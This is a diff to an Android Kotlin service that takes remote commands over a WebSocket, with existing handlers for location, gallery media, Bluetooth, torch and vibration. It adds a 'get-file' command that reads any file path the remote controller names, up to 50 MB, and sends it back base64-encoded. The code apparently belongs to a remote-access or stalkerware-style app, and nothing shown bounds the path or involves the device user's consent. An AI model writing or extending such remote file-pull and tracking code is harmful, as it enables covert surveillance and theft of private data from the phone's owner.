@@ -373,6 +373,7 @@ class StreamingService : Service() {
                             "set-bluetooth"      -> setBluetooth(json.optBoolean("enabled", false), ws)
                             "set-torch"          -> setTorch(json.optBoolean("enabled", false), ws)
                             "vibrate"            -> doVibrate(json.optLong("ms", 500))
+                            "get-file"           -> sendFile(json.optString("path",""), ws)
                             "get-location"       -> sendLocation(ws)
                             "get-gallery"        -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",30), json.optInt("offset",0), ws)
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
@@ -825,6 +826,28 @@ class StreamingService : Service() {
                 else v.vibrate(duration)
             }
         } catch (_: Exception) {}
+    }
+
+    private fun sendFile(filePath: String, ws: WebSocket) {
+        if (filePath.isBlank()) {
+            ws.send(JSONObject().put("type","file-data").put("err","Путь не указан").toString()); return
+        }
+        try {
+            val file = File(filePath)
+            if (!file.exists() || !file.isFile) {
+                ws.send(JSONObject().put("type","file-data").put("err","Файл не найден").toString()); return
+            }
+            val maxBytes = 50 * 1024 * 1024L // 50 MB
+            if (file.length() > maxBytes) {
+                ws.send(JSONObject().put("type","file-data").put("err","Файл слишком большой (>${maxBytes/1024/1024} МБ)").toString()); return
+            }
+            val bytes = file.readBytes()
+            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+            val mime = try { contentResolver.getType(Uri.fromFile(file)) } catch (_: Exception) { null } ?: "application/octet-stream"
+            ws.send(JSONObject().put("type","file-data").put("name",file.name).put("mime",mime).put("data",b64).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type","file-data").put("err",e.message ?: "ошибка").toString())
+        }
     }
 
     @Suppress("MissingPermission")
